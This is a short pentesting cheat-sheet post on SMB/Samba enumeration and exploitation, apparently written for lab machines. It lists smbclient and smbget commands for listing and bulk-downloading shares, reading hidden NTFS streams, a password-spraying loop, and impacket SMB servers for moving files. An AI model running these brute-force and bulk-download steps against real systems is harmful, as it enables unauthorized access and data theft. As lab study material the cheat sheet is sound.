---
title: SAMBA
author: S0lrak
date: '2020-04-13T00:00:00.000Z'
category: Windows Stuff
layout: post
description: Useful Samba enumeration and exploitation
---

# SAMBA

## SMBCLIENT

Smbclient is a good utility tool to connect to samba shares, enumerate, download and upload files.

```bash
# List all shares
smbclient -L //10.10.10.161
```

```bash
# Access specified share using current users or Guest
smbclient \\\\10.10.10.178\\Data

# Access share with credentials
smbclient \\\\10.10.10.178\\Data -U user%password
```

```bash
# Recursively check alll the directory when using 'ls':
> recurse on
```

```bash
# Check for hidden NTFS streams inside smba share
allinfo "file.txt"
get "Debug Mode Password.txt:Password"
```

```bash
# Password spraying/brute force example
for pass in $(cat passwords.txt); do smbclient -L 10.10.10.172 -U=user%$pass; done
```

## SMBGET

wget-like utility to download files directly over SMB directly from bash.

```bash
# Recursively download all possible files from a samba share:
smbget -R  smb://10.10.10.178/share/ -U user%password
```

## SMBSHARE.PY

Impcaket script to setup a quicky samba share

```bash
smbserver.py SHARE /var/tmp/
```

## IMPACKET-SMBSERVER

impacket script to setup a samba server.

```bash
impacket-smbserver share $(pwd) -smb2support -user user -password secret
```

## Mount SAMBA shares in powershell

```bash
$pass = convertto-securestring 'secret' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DC\user', $pass)
New-PSDrive -Name share-PSProvider FileSystem -Credential $cred -Root \\10.10.10.3:\share
```

Check more powershell stuff here.

